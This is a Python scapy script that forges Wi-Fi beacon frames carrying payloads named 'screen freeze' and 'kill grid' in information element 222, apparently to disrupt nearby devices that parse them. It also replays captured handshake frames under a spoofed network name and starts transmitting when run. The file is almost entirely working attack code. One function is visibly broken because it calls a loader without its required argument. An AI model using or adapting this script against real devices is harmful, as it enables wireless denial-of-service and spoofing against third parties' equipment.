import json
import random
import binascii
from time import sleep
from scapy.all import *
from hashlib import sha256

CALLING_CARD_PAYLOAD = 0
SCREEN_FREEZE_PAYLOAD = 1
KILL_GRID_PAYLOAD = 2
TEST_PAYLOAD = 3
WIRELESS_INTERFACE = "wlan0"

pwn_packet_path = "./data/pwn_packet"
blank_packet_path = "./packets/blank.pcap"
pwn_payload_paths = [
    "./payloads/calling_card.json",
    "./payloads/screen_freeze.json",
    "./payloads/kill_grid.json",
    "./payloads/test.json",
]
attack_handshake_path = "./data/handshake.pcap"
handshake_unmod_path = "./data/handshake_unmod.pcap"


def get_payload_data(payload_file_name):
    f = open(payload_file_name)
    data = json.load(f)
    return data


def get_random_identity():
    num = random.random()
    return sha256(str(num).encode("utf-8")).hexdigest()


def get_pwn_packet():
    pwn_packet = rdpcap(pwn_packet_path)
    return pwn_packet[0]


def get_blank_packet():
    pwn_packet = rdpcap(blank_packet_path)
    return pwn_packet[0]


def get_handshake_packets(handshake_path):
    handshake_packets = rdpcap(handshake_path)
    return handshake_packets


def send_calling_card():
    calling_card_payload = get_payload_data(pwn_payload_paths[CALLING_CARD_PAYLOAD])
    calling_card_payload["identity"] = get_random_identity()
    calling_card_payload_bytes = json.dumps(calling_card_payload).encode()
    print(calling_card_payload_bytes)

    payload_chunks = [
        calling_card_payload_bytes[i : i + 255]
        for i in range(0, len(calling_card_payload_bytes), 255)
    ]
    packet = get_pwn_packet()

    load_payload_into_packet(packet, payload_chunks)

    packet.show()

    send_packet(packet, 10, 2)


def send_screen_freeze():
    calling_card_payload = get_payload_data(pwn_payload_paths[SCREEN_FREEZE_PAYLOAD])
    calling_card_payload["identity"] = get_random_identity()
    calling_card_payload_bytes = json.dumps(calling_card_payload).encode()
    print(calling_card_payload_bytes)

    payload_chunks = [
        calling_card_payload_bytes[i : i + 255]
        for i in range(0, len(calling_card_payload_bytes), 255)
    ]
    packet = get_pwn_packet()

    load_payload_into_packet(packet, payload_chunks)

    send_packet(packet, 10, 2)
    send_packet(packet, 10, 2)
    send_packet(packet, 10, 2)
    send_packet(packet, 10, 2)
    send_packet(packet, 10, 2)


def send_kill_grid():
    calling_card_payload = get_payload_data(pwn_payload_paths[KILL_GRID_PAYLOAD])
    calling_card_payload_bytes = json.dumps(calling_card_payload).encode()
    print(calling_card_payload_bytes)

    payload_chunks = [
        calling_card_payload_bytes[i : i + 255]
        for i in range(0, len(calling_card_payload_bytes), 255)
    ]
    packet = get_pwn_packet()

    load_payload_into_packet(packet, payload_chunks)

    send_packet(packet, 5, 2)
    send_packet(packet, 5, 2)
    send_packet(packet, 5, 2)


def send_packet(packet, play_count, sleep_time):
    sendp(packet, loop=0, count=play_count, iface=WIRELESS_INTERFACE, verbose=True)
    if sleep_time > 0:
        sleep(sleep_time)


def set_info_data(elt, data):
    elt.setfieldval("ID", 222)
    elt.setfieldval("info", data)
    elt.setfieldval("len", len(data))
    return elt


def load_payload_into_packet(packet, payload_chunks):
    beacon_frame = packet[Dot11][Dot11Beacon]

    elt1 = beacon_frame[Dot11Elt]
    elt2 = elt1.payload.getlayer(Dot11Elt)
    elt3 = elt2.payload.getlayer(Dot11Elt)

    set_info_data(elt1, b"")
    set_info_data(elt2, b"")
    set_info_data(elt3, b"")

    last_elt = elt1

    for i in range(0, len(payload_chunks)):
        chunk = payload_chunks[i]
        if i == 0:
            set_info_data(elt1, chunk)
            last_elt = elt1
        if i == 1:
            set_info_data(elt2, chunk)
            last_elt = elt2
        if i == 2:
            set_info_data(elt3, chunk)
            last_elt = elt3
        if i > 2:
            new_elt = Dot11Elt()
            set_info_data(new_elt, chunk)
            last_elt.add_payload(new_elt)
            last_elt = new_elt


def replay_handshake(handshake_path, new_name):
    handshake_packets = get_handshake_packets(handshake_path)
    for i in range(0, len(handshake_packets)):
        packet = handshake_packets[i]

        if i == 1 or i == 3:
            el1 = handshake_packets[i][Dot11][Dot11Beacon][Dot11Elt]

            el1.setfieldval("info", new_name)
            el1.setfieldval("len", len(new_name))

        print(packet.show())
        sendp(packet, loop=0, count=1, iface="wlan0", verbose=True)


def handshake_attack():
    handshake_packets = get_handshake_packets()

    new_ap_name = "PWND U"

    for i in range(0, 100):
        packet_one = handshake_packets[0]
        packet_two = handshake_packets[1]

        elt1 = packet_two[Dot11][Dot11Beacon][Dot11Elt]

        elt1.setfieldval("info", new_ap_name)
        elt1.setfieldval("len", len(new_ap_name))

        sendp(packet_one, loop=0, count=10, iface="wlan0", verbose=True)
        sendp(packet_two, loop=0, count=10, iface="wlan0", verbose=True)
        sleep(0.3)

    sleep(5)

    packet_three = handshake_packets[2]
    packet_four = handshake_packets[3]

    elt1 = packet_four[Dot11][Dot11Beacon][Dot11Elt]

    elt1.setfieldval("info", new_ap_name)
    elt1.setfieldval("len", len(new_ap_name))

    sendp(packet_three, loop=0, count=1, iface="wlan0", verbose=True)
    sendp(packet_four, loop=0, count=1, iface="wlan0", verbose=True)


def send_test():
    calling_card_payload = get_payload_data(pwn_payload_paths[CALLING_CARD_PAYLOAD])
    calling_card_payload["identity"] = get_random_identity()
    calling_card_payload_bytes = json.dumps(calling_card_payload).encode()
    print(calling_card_payload_bytes)

    payload_chunks = [
        calling_card_payload_bytes[i : i + 255]
        for i in range(0, len(calling_card_payload_bytes), 255)
    ]
    packet = explain_packet()

    packet.show()

    load_payload_into_blank_packet(packet, payload_chunks)

    packet.show()

    send_packet(packet, 10, 2)


def craft_packet():
    pwn_packet = get_pwn_packet()

    dot11 = pwn_packet[Dot11]

    dot11.setfieldval("addr3", "be:ef:de:ad:be:ef")
    dot11.show()

    beacon_frame = pwn_packet[Dot11][Dot11Beacon]
    beacon_frame.remove_payload()
    beacon_frame.show()
    pwn_packet.show()

    wrpcap("blank.pcap", pwn_packet)
    return


def load_payload_into_blank_packet(packet, payload_chunks):
    beacon_frame = packet[Dot11][Dot11Beacon]
    last_elt = beacon_frame

    for i in range(0, len(payload_chunks)):
        chunk = payload_chunks[i]
        new_elt = Dot11Elt()
        set_info_data(new_elt, chunk)
        last_elt.add_payload(new_elt)
        last_elt = new_elt


def explain_packet():

    packet2 = (
        RadioTap()
        / Dot11FCS(
            addr1="ff:ff:ff:ff:ff:ff",
            addr2="de:ad:be:ef:de:ad",
            addr3="be:ef:de:ad:be:ef",
        )
        / Dot11Beacon()
    )

    return packet2


send_test()
